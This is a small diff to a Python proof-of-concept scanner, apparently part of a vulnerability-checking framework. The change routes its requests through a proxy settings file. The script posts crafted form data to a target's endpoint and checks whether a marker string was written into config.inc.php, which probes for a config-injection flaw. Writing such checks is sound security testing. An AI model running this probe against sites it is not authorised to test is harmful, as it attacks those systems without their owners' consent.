@@ -2,11 +2,10 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-import requests.packages.urllib3
+from Config.config_proxies import proxies
 from Config.config_requests import headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -38,9 +37,9 @@ def poc(target):
         "submit" : "yes",
         poc_key : "aaaa"
     }
-    requests.post(vul_url, headers=headers, data=data, verify=False, timeout=5)
+    requests.post(vul_url, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
     target_url = target+"/utility/convert/data/config.inc.php"
-    target_res = requests.get(target_url, headers=headers, verify=False, timeout=5)
+    target_res = requests.get(target_url, headers=headers, verify=False, timeout=5,proxies=proxies)
     if "this is a friendly test, Please check and repair vulnerabilities." in target_res.text:
         result['poc_url'] = target_url
         result['poc'] =NAME
